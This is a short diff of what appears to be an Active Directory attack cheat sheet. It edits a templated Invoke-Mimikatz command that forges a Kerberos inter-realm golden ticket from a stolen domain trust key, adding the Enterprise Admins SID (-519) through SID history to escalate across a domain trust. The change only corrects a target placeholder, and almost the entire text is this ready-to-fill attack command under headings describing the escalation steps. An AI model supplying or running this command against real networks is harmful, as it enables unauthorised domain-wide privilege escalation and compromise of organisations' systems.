@@ -399,7 +399,7 @@ or
 
 ask tgt as enterprise admin with the domain trust key:
 ```
-Invoke-Mimikatz -Command '"kerberos::golden /user:<anyuser> /domain:<current-domain> /sid:<sid-current-domain> /sids:<sid-target-domain>-519 /rc4:<trust-key> /service:krbtgt /target:<target-dc>"'
+Invoke-Mimikatz -Command '"kerberos::golden /user:<anyuser> /domain:<current-domain> /sid:<sid-current-domain> /sids:<sid-target-domain>-519 /rc4:<trust-key> /service:krbtgt /target:<target-DOMAIN>"'
 ```
 ask tgs:
 ```
